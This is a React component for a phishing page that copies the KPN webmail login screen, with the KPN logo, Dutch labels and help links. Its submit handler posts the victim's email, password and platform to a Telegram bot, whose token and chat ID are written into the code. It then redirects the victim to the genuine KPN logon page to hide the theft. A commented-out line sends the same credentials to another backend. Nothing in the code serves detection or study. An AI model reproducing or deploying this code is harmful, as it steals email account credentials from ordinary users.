import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';
import eatel from './eatel.png';
import kpn from './kpn.png';

function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("KPN")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
          const response =   await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
            chat_id: 6150403557,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://webmail.kpnmail.nl/mail/logon.asp';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className=' px-3'>
            <img  src={kpn} className="myimage"/>

            </div>

            <div className='px-3 text-center mb-4'style={{
              fontSize:"30px",
              fontWeight:"400",
            }}>
             Inloggen Webmail

            </div>


            <div className='col-md-5 whitediv m-auto px-0 py-3'>
              
                



                <form onSubmit={handleSubmit} className="px-5 ">

                    <div className='form-group'>
                        {/* <label className='label'> E-mail address</label> */}
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email}placeholder='Gebruikersnaam / e-mailadres' className="form-control"required />

                    </div>


                    <div className='form-group'>
                        {/* <label className='label'> Password</label> */}
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} placeholder='Wachtwoord' className="form-control"required />

                    </div>

                    <div className='form-group'>

                      <input type="checkbox" /> <span className='px-3'> Onthoud mijn gebruikersnaam</span>

                    </div>


                   


                   


                  

                    <div className='form-group text-center py-4'>

<button type='submit' style={{
    background:"#09F",
}}className='btn text-center w-100 font-weight-bold text-light py-2'>LOGIN</button>




<br/>


<h6 className='text-center mt-4'>Waarmee kunnen we je helpen?</h6>


<ul className='bottom text-left py-1'>
  <li className='items'>Wachtwoord vergeten</li>
  <li className='items'>Alles over KPN e-mail en Webmail</li>
  <li className='items'>E-mail instellen op je mobiele telefoon</li>
  <li className='items'> Problemen bij het ontvangen en versturen van e-mail</li>
  <li className='items'> Freeler e-mail instellingen beheren</li>


</ul>


</div>


                 

                </form>

            </div>
        
        </>
    );
}

export default Home;